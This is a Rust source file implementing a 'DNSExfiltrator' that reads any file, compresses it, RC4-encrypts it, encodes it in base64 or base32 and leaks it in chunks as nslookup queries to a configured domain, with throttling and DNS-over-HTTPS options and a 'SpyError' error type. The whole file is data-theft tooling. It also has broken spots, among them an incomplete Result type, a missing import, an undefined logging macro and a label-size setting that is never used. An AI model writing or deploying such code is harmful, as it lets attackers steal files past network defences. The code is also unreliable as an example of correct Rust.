use std::fs::File;
use std::io::{self, Read};
use std::path::Path;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;
use base64::{encode_config, URL_SAFE_NO_PAD};
use flate2::write::GzEncoder;
use flate2::Compression;
use rc4::Rc4;
use std::collections::HashMap;

pub struct DNSExfiltrator {
    domain_name: String,
    password: String,
    use_base32: bool,
    throttle_time: u64,
    request_max_size: usize,
    label_max_size: usize,
    doh_provider: Option<String>,
    dns_server: Option<String>,
}

impl DNSExfiltrator {
    pub fn new(domain_name: String, password: String) -> Self {
        Self {
            domain_name,
            password,
            use_base32: false,
            throttle_time: 0,
            request_max_size: 255,
            label_max_size: 63,
            doh_provider: None,
            dns_server: None,
        }
    }

    pub fn set_options(&mut self, use_base32: bool, throttle_time: u64, request_max_size: usize, label_max_size: usize) {
        self.use_base32 = use_base32;
        self.throttle_time = throttle_time;
        self.request_max_size = request_max_size;
        self.label_max_size = label_max_size;
    }

    pub fn set_dns_options(&mut self, doh_provider: Option<String>, dns_server: Option<String>) {
        self.doh_provider = doh_provider;
        self.dns_server = dns_server;
    }

    pub fn exfiltrate(&self, file_path: &Path) -> io::Result<()> {
        let mut file = File::open(file_path)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)?;

        let compressed_data = self.compress_data(&buffer)?;
        let encrypted_data = self.encrypt_data(&compressed_data);
        let encoded_data = if self.use_base32 {
            base32::encode(base32::Alphabet::RFC4648 { padding: false }, &encrypted_data)
        } else {
            encode_config(&encrypted_data, URL_SAFE_NO_PAD)
        };

        self.send_data(&encoded_data);
        Ok(())
    }

    fn compress_data(&self, data: &[u8]) -> io::Result<Vec<u8>> {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(data)?;
        encoder.finish()
    }

    fn encrypt_data(&self, data: &[u8]) -> Vec<u8> {
        let mut rc4 = Rc4::new(self.password.as_bytes());
        let mut encrypted_data = data.to_vec();
        rc4.process(&data, &mut encrypted_data);
        encrypted_data
    }

    fn send_data(&self, data: &str) {
        let chunks = self.chunk_data(data);
        for (i, chunk) in chunks.iter().enumerate() {
            let domain = format!("{}.{}.{}", i, chunk, self.domain_name);
            self.send_dns_request(&domain);
            sleep(Duration::from_millis(self.throttle_time));
        }
    }

    fn chunk_data(&self, data: &str) -> Vec<String> {
        let mut chunks = Vec::new();
        let mut start = 0;
        while start < data.len() {
            let end = std::cmp::min(start + self.request_max_size, data.len());
            chunks.push(data[start..end].to_string());
            start = end;
        }
        chunks
    }

    fn send_dns_request(&self, domain: &str) -> Result<()> {
        let mut cmd = Command::new("nslookup");
        
        if let Some(dns_server) = &self.dns_server {
            cmd.arg(dns_server);
        }
        
        if let Some(doh_provider) = &self.doh_provider {
            match doh_provider.as_str() {
                "google" => {
                    cmd.arg("--type=TXT");
                    cmd.arg("dns.google.com");
                }
                "cloudflare" => {
                    cmd.arg("--type=TXT");
                    cmd.arg("1.1.1.1");
                }
                _ => return Err(SpyError::DnsExfiltration(
                    format!("Unknown DoH provider: {}", doh_provider)
                )),
            };
        }
        
        cmd.arg(domain);
        
        let output = cmd.output().map_err(|e| {
            error!("DNS request failed: {}", e);
            SpyError::DnsExfiltration(format!("Failed to execute DNS request: {}", e))
        })?;

        if !output.status.success() {
            let error_msg = String::from_utf8_lossy(&output.stderr);
            error!("DNS request failed: {}", error_msg);
            return Err(SpyError::DnsExfiltration(error_msg.to_string()));
        }

        Ok(())
    }
}

mod base32 {
    use std::collections::HashMap;

    pub fn encode(alphabet: Alphabet, data: &[u8]) -> String {
        let base32_alphabet = match alphabet {
            Alphabet::RFC4648 { padding } => {
                let mut map = HashMap::new();
                for (i, c) in "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".chars().enumerate() {
                    map.insert(i as u8, c);
                }
                map
            }
        };

        let mut encoded = String::new();
        let mut buffer = 0u32;
        let mut bits_left = 0;

        for &byte in data {
            buffer <<= 8;
            buffer |= byte as u32;
            bits_left += 8;

            while bits_left >= 5 {
                let index = (buffer >> (bits_left - 5)) & 0x1F;
                encoded.push(base32_alphabet[&(index as u8)]);
                bits_left -= 5;
            }
        }

        if bits_left > 0 {
            let index = (buffer << (5 - bits_left)) & 0x1F;
            encoded.push(base32_alphabet[&(index as u8)]);
        }

        encoded
    }

    pub enum Alphabet {
        RFC4648 { padding: bool },
    }
} 